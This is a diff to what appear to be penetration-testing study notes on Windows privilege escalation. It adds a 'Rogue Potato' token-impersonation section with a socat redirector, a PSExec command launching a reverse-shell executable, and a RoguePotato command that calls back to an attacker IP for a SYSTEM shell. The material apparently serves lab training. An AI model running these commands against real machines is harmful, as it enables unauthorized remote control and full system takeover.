@@ -481,6 +481,24 @@ When this registry key is enabled, it allows non-administrator users to install 
 - Press enter to spawn a command prompt with admin privileges
 
 
+### TOKEN IMPERSONATION-Rogue Potato
+
+- Set up a socat redirector redirecting traffic from a port on your machine to another port on the victim machine
+
+      sudo socat tcp-listen:[listening port],reuseaddr,fork tcp:[target-ip]:[port]
+
+- Start a listener on Kali. Simulate getting a service account shell by logging into RDP as the admin user, starting an elevated command prompt (right-click -> run as administrator) and using PSExec64.exe to trigger the reverse.exe executable you created with the permissions of the "local service" account.
+
+      C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe
+
+![image](https://github.com/user-attachments/assets/bfd711a0-b618-4bec-86b8-11367034372f)
+
+- Now, in the "local service" reverse shell you triggered, run the RoguePotato exploit to trigger a second reverse shell running with SYSTEM privileges (update the IP address with your Kali IP accordingly):
+
+      C:\PrivEsc\RoguePotato.exe -r 10.10.10.10 -e "C:\PrivEsc\reverse.exe" -l 9999
+
+- System shell
+
 
 
 ### OFFSEC
@@ -604,9 +622,7 @@ Management Users can access it with WinRM.
   
 
 - Finding running processes, use powershell `Get-Process` cmdlet
-- The listed processes might not be complete.Check for files in the `c:/` directory
-
-      
+- The listed processes might not be complete.Check for files in the `c:/` directory      
 
 
 
